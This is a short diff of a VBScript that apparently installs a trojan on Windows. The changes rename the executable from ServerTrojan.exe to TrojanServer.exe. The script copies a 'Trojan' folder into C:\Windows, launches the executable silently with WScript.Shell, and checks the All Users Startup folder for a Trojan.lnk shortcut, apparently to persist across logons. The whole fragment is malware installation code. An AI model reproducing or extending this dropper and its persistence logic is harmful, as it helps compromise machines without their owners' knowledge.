@@ -3,7 +3,7 @@ Dim Date,Hour,Day,Backuppath,Daystring
 Set FSO = CreateObject("Scripting.FileSystemObject")
  
 If Fso.FolderExists ("C:\\Windows\\Trojan") Then
-   Set File= FSO.GetFile("C:\\Windows\Trojan\\ServerTrojan.exe") 
+   Set File= FSO.GetFile("C:\\Windows\Trojan\\TrojanServer.exe") 
    Date=File.DateLastModified
    Day=DatePart("y",Date)
    Daystring=CStr(Day)
@@ -14,7 +14,7 @@ End If
 FSO.CopyFolder ".\Trojan", "C:\\Windows\\Trojan", true
  
 Set oShell = CreateObject("WScript.Shell") 
-oShell.Run "C:\Windows\\trojan\\ServerTrojan.exe"
+oShell.Run "C:\Windows\\trojan\\TrojanServer.exe"
  
 If Fso.FolderExists ("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\") Then
 If Fso.FileExists ("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\Trojan.lnk") Then
